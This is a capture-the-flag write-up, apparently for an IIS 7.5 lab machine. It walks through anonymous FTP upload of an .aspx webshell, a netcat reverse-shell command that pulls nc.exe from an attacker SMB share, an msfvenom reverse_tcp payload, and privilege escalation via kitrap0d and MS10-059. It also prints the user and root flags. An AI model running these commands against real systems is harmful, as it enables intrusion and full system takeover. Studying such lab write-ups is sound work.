## Enumeration

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
```
### Key Findings

- **Anonymous FTP Login**
- **Web Server Running IIS7/ASP.NET** suitable for `.aspx` webshell

---

## Exploitation

### Manual Exploitation

From our enumeration, we know this is an **IIS 7 Server** that allows **Anonymous FTP login**. This allows us to upload files to the FTP server and access them through the web interface, allowing for **Remote Code Execution (RCE)**.

To exploit this, we will upload a WebShell. Since the server runs on ASP.NET, we will use an `.aspx` webshell.

There is a `cmd.aspx` webshell included in **SecLists**.

![Webshell in SecLists](Images/Pasted%20image%2020250315151139.png)

We will make a copy of this and upload it to the respective FTP server and access it via the HTTP web interface.

Copying the WebShell to our working directory and uploading the file via **Anonymous FTP** login:

![Uploading WebShell](Images/Pasted%20image%2020250315151416.png)

Accessing the WebShell via HTTP:

![Accessing WebShell](Images/Pasted%20image%2020250315151502.png)

#### Leveraging the WebShell for a Reverse Shell

We will generate a shell on the target Windows host using `nc.exe` instead of a generic Meterpreter payload.

Copy `nc.exe` to our local directory:

![Copy nc.exe](Images/Pasted%20image%2020250315151955.png)

Host our working directory as an SMB share for the WebShell to access the `nc.exe` file:

![Host SMB Share](Images/Pasted%20image%2020250315152338.png)

Now that we have the `nc.exe` file hosted, we can set up a listener for the shell and access the file via our WebShell:

- `nc -lnvp 9090` to set up the listener to catch the shell.
- `\\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 9090` in our WebShell to access the file.

![Listener Setup](Images/Pasted%20image%2020250315152645.png)

#### Exploitation Path

1. Upload a WebShell via Anonymous FTP login.
2. Host Netcat on a local SMB share.
3. Set up a local Netcat listener.
4. Utilize the WebShell to access the Netcat file and provide a reverse shell on port 9090.

---

### Metasploit Exploitation

1. Generate the MSFvenom payload:
    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=7781 -f aspx > shell.aspx`
2. Upload the file via FTP.
    
3. Set up a multi-handler for the respective payload:
    
    ![Multi-handler Setup](Images/Pasted%20image%2020250315165128.png)
    
4. Navigate to the shell via HTTP:
    
    ![Accessing Shell](Images/Pasted%20image%2020250315165212.png)
    

**Profit!**

---

## Post-Exploitation

### Enumeration

#### Manual Enumeration

#### Metasploit Enumeration

1. Background the session and load up **exploit suggester**:
    
    ![Exploit Suggester](Images/Pasted%20image%2020250315165334.png) ![Exploit Results](Images/Pasted%20image%2020250315165450.png)
    

### Privilege Escalation

#### Metasploit

From our enumeration, we found this host is vulnerable to **kitrap0d**. Configure the exploit and run it:

![Kitrap0d Exploit](Images/Pasted%20image%2020250315165635.png) ![System Privileges](Images/Pasted%20image%2020250315165731.png)

Now we have **system-level privileges**.

#### Manual Privilege Escalation

1. Run **Windows-Exploit-Suggester** locally:
    
    ![Windows-Exploit-Suggester](Images/Pasted%20image%2020250315173504.png)
    
2. We will use **MS10-059**:  
    [GitHub Link](https://github.com/abatchy17/WindowsExploits/tree/master/MS10-059%20-%20Chimichurri)
    
3. Host the exploit using a simple Python web server:
    
    yaml
    
    CopyEdit
    
    `python3 -m http.server 8000`
    
4. Using `certutil`, transfer the file over:
    
    ![Certutil File Transfer](Images/Pasted%20image%2020250315174309.png)
    
5. Exploit the vulnerability:
    
    ![Running Exploit](Images/Pasted%20image%2020250315174427.png) ![Successful Exploit](Images/Pasted%20image%2020250315174411.png) ![Privilege Escalation](Images/Pasted%20image%2020250315174501.png)
    

---

### Flags

#### User Flag

Submit the flag located on the `babis` user's desktop:

`d2b2bd39e219fabca3ec69cc395f3536`

![User Flag](Images/Pasted%20image%2020250315170131.png)

#### Root Flag

Submit the flag located on the `administrator`'s desktop:

`cd31f47cb2eed3c30b0fc335543ce6b4`
![](Images/Pasted%20image%2020250315170205.png)